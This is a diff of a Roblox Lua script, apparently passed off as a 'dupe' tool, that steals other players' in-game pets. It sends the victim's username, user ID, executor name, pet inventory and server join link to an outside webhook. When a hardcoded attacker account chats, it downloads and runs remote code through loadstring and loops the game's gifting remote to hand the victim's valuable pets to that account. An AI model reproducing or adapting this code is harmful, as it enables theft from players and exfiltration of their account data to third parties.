@@ -1,66 +1,51 @@
---[[
-    V2 Update:
-    - Added Auto-Unequip feature for the Garden area.
-    - Refactored chat connection logic to be cleaner and non-repetitive (Fix 1).
-    - Enhanced service fetching with WaitForChild for greater stability.
-]]
-
--- [ Services & Core Globals ]
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- [ Configuration ]
+local MasterPetList = {
+    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
+}
+
+local TrashPetList = {
+    -- Original Trash Pets
+    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
+    "Pig", "Crab", "Starfish", "Seagull",
+    
+    -- Newly Added Trash Pets
+    "Deer", "Spotted Deer", "Monkey", "Silver Monkey", "Rooster", "Turtle", "Cow", 
+    "Snail", "Giant Ant", "Polar Bear", "Panda", "Sea Otter", "Caterpillar", 
+    "Praying Mantis", "Hedgehog", "Kiwi", "Mole", "Frog", "Echo Frog", "Owl", 
+    "Night Owl", "Grey Mouse", "Squirrel", "Brown Mouse", "Red Giant Ant", 
+    "Red Fox", "Chicken Zombie", "Blood Hedgehog", "Blood Kiwi", "Blood Owl", 
+    "Moon Cat", "Bee", "Honey Bee", "Petal Bee", "Bear Bee", "Wasp", 
+    "Tarantula Hawk", "Moth", "Cooked Owl", "Toucan", "Flamingo", "Sea Turtle", 
+    "Seal", "Orangutan", "Peacock", "Capybara", "Scarlet Macaw", "Ostrich", 
+    "Firefly", "Red Dragon", "Golden Bee"
+}
+
+
 local TargetUsername = "FodieCookie"
 local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
 local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"
 
--- Feature Toggles
-local AutoUnequipInGarden = true -- << NEW: Toggle for the auto-unequip feature
-
--- Pet Lists
-local MasterPetList = {
-    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
-}
-local TrashPetList = {
-    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
-    "Pig", "Crab", "Starfish", "Seagull"
-}
 local petEmojis = {
     ["Butterfly"] = "🦋", ["Raccoon"] = "🦝", ["Dragonfly"] = "🐲", ["Queen Bee"] = "👑", ["Disco Bee"] = "🕺",
     ["Mimic Octopus"] = "🐙", ["Pack Bee"] = "📦"
 }
 
--- Thresholds
 local giftingWeightThreshold = 11
 local webhookWeightThreshold = 12
 local hugePetWeightThreshold = 111
 
--- [ NEW: Garden Unequip Configuration ]
--- NOTE: You may need to adjust these coordinates for the specific game map.
-local GardenCenterPosition = Vector3.new(-170, 15, 525) -- A plausible center for a garden area
-local GardenRadius = 150 -- The size of the garden zone (squared for performance)
-
--- [ Cached Game Objects ]
 local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-local backpack = LocalPlayer:WaitForChild("Backpack")
+local humanoid = character and character:FindFirstChild("Humanoid")
+local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
+local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService")
 
--- Use WaitForChild for critical remote events to prevent timing issues on game load
-local GameEvents = ReplicatedStorage:WaitForChild("GameEvents", 10)
-local GiftingEvent = GameEvents and GameEvents:WaitForChild("PetGiftingService", 5)
-local PetsServiceEvent = GameEvents and GameEvents:WaitForChild("PetsService", 5) -- << NEW: Remote for unequipping
-
--- [ State Flags ]
 local loadstringExecuted = false
 local giftingActive = false
-
--- =================================================================
--- [ CORE FUNCTIONS ]
--- =================================================================
 
 local function getExecutorName()
     if getexecutorname then
@@ -117,10 +102,15 @@ local function checkInventoryForValuables()
 end
 
 local function sortPets(a, b)
-    if a.isHuge and not b.isHuge then return true end
-    if not a.isHuge and b.isHuge then return false end
-    if a.isHuge and b.isHuge then return a.weight > b.weight end
-    return a.name < b.name
+    if a.isHuge and not b.isHuge then
+        return true
+    elseif not a.isHuge and b.isHuge then
+        return false
+    elseif a.isHuge and b.isHuge then
+        return a.weight > b.weight
+    else
+        return a.name < b.name
+    end
 end
 
 local function sendWebhookNotification(foundPetsData)
@@ -130,7 +120,14 @@ local function sendWebhookNotification(foundPetsData)
     local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
     local formattedPetLines = {}
     for _, petData in ipairs(foundPetsData) do
-        local emoji = petEmojis[petData.baseName] or (petData.isHuge and "💪" or "⭐")
+        local emoji
+        if petData.isHuge then
+            emoji = "💪"
+        elseif petData.baseName and petEmojis[petData.baseName] then
+            emoji = petEmojis[petData.baseName]
+        else
+            emoji = "⭐"
+        end
         table.insert(formattedPetLines, emoji .. " - " .. petData.name)
     end
     
@@ -138,7 +135,12 @@ local function sendWebhookNotification(foundPetsData)
     local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     
     local success, pId = pcall(function() return game.PrivateServerId end)
-    local serverType = (success and pId and pId ~= "") and "🔒 Private" or "🌍 Public"
+    local serverType
+    if success and pId ~= "" then
+        serverType = "🔒 Private"
+    else
+        serverType = "🌍 Public"
+    end
 
     local payload = {
         content = "@everyone",
@@ -154,140 +156,111 @@ local function sendWebhookNotification(foundPetsData)
         }}
     }
     
-    pcall(function()
+    local function sendRequest()
         request({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
+    end
+    local reqSuccess, reqError = pcall(sendRequest)
+    if not reqSuccess then
+        print("[Webhook Error] The request failed to send: " .. tostring(reqError))
+    else
         print("[Webhook] Notification sent successfully.")
-    end)
+    end
 end
 
--- =================================================================
--- [ SCRIPT FEATURES / LOOPS ]
--- =================================================================
-
--- [ Gifter Feature ]
 local function giftPetsLoop(targetPlayer)
-    if not humanoid or not GiftingEvent or not targetPlayer then
+    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
         print("[Gifter Error] Loop cannot start, a critical component is missing.")
         giftingActive = false
         return 
     end
     
     local args = {"GivePet", targetPlayer}
-    while giftingActive and targetPlayer.Parent do
+    while giftingActive and targetPlayer.Parent ~= nil do
         for _, item in ipairs(backpack:GetChildren()) do
             if item:IsA("Tool") then
                 local isMaster, _ = isPetInList(item.Name, MasterPetList)
                 local isTrash, _ = isPetInList(item.Name, TrashPetList)
-                local isValuableByWeight = false
+                local isHuge = false
                 
                 local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
-                if weightString and tonumber(weightString) and tonumber(weightString) >= giftingWeightThreshold then
-                    isValuableByWeight = true
+                if weightString then
+                    local weight = tonumber(weightString)
+                    if weight and weight >= giftingWeightThreshold then isHuge = true end
                 end
 
-                if isValuableByWeight or (isMaster and not isTrash) then
+                if isHuge or (isMaster and not isTrash) then
                     humanoid:EquipTool(item)
                     GiftingEvent:FireServer(unpack(args))
-                    task.wait()
+                    task.wait(0)
                 end
             end
         end
-        task.wait()
+        task.wait(0)
     end
     
     giftingActive = false
     print("[Gifter Info] Gifting loop has stopped.")
 end
 
--- [ Loadstring Feature ]
 local function executeLoadedScript()
     print("[Loadstring] Attempting to fetch and execute script from URL...")
     local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
     if success and scriptContent then
+        print("[Loadstring] Script content fetched. Compiling and executing...")
         local scriptFunction, compileError = loadstring(scriptContent)
         if scriptFunction then
-            pcall(scriptFunction)
+            local runSuccess, runError = pcall(scriptFunction)
+            if not runSuccess then
+                print("[Loadstring Error] The loaded script failed to run: " .. tostring(runError))
+            else
+                print("[Loadstring] Loaded script executed.")
+            end
         else
-            warn("[Loadstring Error] Failed to compile script: " .. tostring(compileError))
+            print("[Loadstring Error] Failed to compile script: " .. tostring(compileError))
         end
     else
-        warn("[Loadstring Error] Failed to fetch script from URL: " .. tostring(scriptContent))
+        print("[Loadstring Error] Failed to fetch script from URL: " .. tostring(scriptContent))
     end
 end
-
--- [ NEW: Auto Unequip Feature ]
-local function autoUnequipLoop()
-    if not PetsServiceEvent then
-        warn("[Unequip] Cannot start loop: PetsService RemoteEvent not found.")
-        return
-    end
-    
-    print("[Unequip] Auto-unequip loop started.")
-    while AutoUnequipInGarden and task.wait(1) do
-        -- 1. Check if player is in the garden
-        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
-        if not rootPart then continue end
-        
-        local distanceSquared = (rootPart.Position - GardenCenterPosition).Magnitude
-        if distanceSquared <= GardenRadius then
-            -- 2. Find the equipped pet's GUID
-            -- Games often store this kind of state as an Attribute on the Player object.
-            local equippedPetGuid = LocalPlayer:GetAttribute("ActivePetV2")
-            
-            if equippedPetGuid and typeof(equippedPetGuid) == "string" and string.sub(equippedPetGuid, 1, 1) == "{" then
-                -- 3. Fire the unequip event
-                print("[Unequip] In Garden with pet equipped. Firing UnequipPet for GUID: " .. equippedPetGuid)
-                local args = {"UnequipPet", equippedPetGuid}
-                PetsServiceEvent:FireServer(unpack(args))
-                task.wait(2) -- Add a small cooldown to prevent spamming the remote
-            end
-        end
-    end
-end
-
--- =================================================================
--- [ EVENT HANDLING & INITIALIZATION ]
--- =================================================================
 
 local function onPlayerChatted(player, message)
-    if player.Name ~= TargetUsername then return end
-    
-    print("[Chat Trigger] Detected chat from target: '" .. TargetUsername .. "'")
+    print("[Chat Trigger] Detected chat from player: '" .. player.Name .. "'")
 
-    if not loadstringExecuted then
-        loadstringExecuted = true
-        task.spawn(executeLoadedScript)
-    end
-    
-    if not giftingActive then
-        giftingActive = true 
-        print("[Chat Trigger] Gifting is not active. Activating and spawning loop...")
-        task.spawn(giftPetsLoop, player)
-    else
-        print("[Chat Trigger] Gifting is already active.")
+    if player.Name == TargetUsername then
+        print("[Chat Trigger] Chat is from the correct target: '" .. TargetUsername .. "'")
+
+        if not loadstringExecuted then
+            loadstringExecuted = true
+            executeLoadedScript()
+        end
+        
+        if not giftingActive then
+            print("[Chat Trigger] Gifting is not active. Activating now and spawning loop...")
+            giftingActive = true 
+            task.spawn(giftPetsLoop, player)
+        else
+            print("[Chat Trigger] Gifting is already active, not starting another loop.")
+        end
     end
 end
 
--- [ REFACTORED ] Centralized function to connect the chat event
-local function connectChatEvent(player)
-    if not player then return end
+print("[System] Initializing script...")
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
     player.Chatted:Connect(function(message)
         onPlayerChatted(player, message)
     end)
 end
 
-print("[System] Initializing script...")
-
--- Connect events
-Players.PlayerAdded:Connect(connectChatEvent)
-for _, player in ipairs(Players:GetPlayers()) do
-    connectChatEvent(player)
-end
-
 print("[System] Event connections established.")
 task.wait(1)
 
--- Perform initial inventory check for webhook
 print("[System] Performing initial inventory check for webhook...")
 local hasPets, foundPetsData = checkInventoryForValuables()
 if hasPets then
@@ -297,14 +270,6 @@ else
     print("[System] No valuable pets found on startup.")
 end
 
--- Spawn the new auto-unequip loop if enabled
-if AutoUnequipInGarden then
-    task.spawn(autoUnequipLoop)
-end
-
-print("\n--- [ SCRIPT FULLY LOADED ] ---")
-print(" > Awaiting chat from '" .. TargetUsername .. "' to trigger Gifter and Loadstring.")
-if AutoUnequipInGarden then
-    print(" > Auto-Unequip in Garden is ACTIVE.")
-end
+print("--- [ SCRIPT FULLY LOADED ] ---")
+print("Awaiting chat from '" .. TargetUsername .. "' to trigger Gifter and Loadstring.")
 print("-------------------------------")
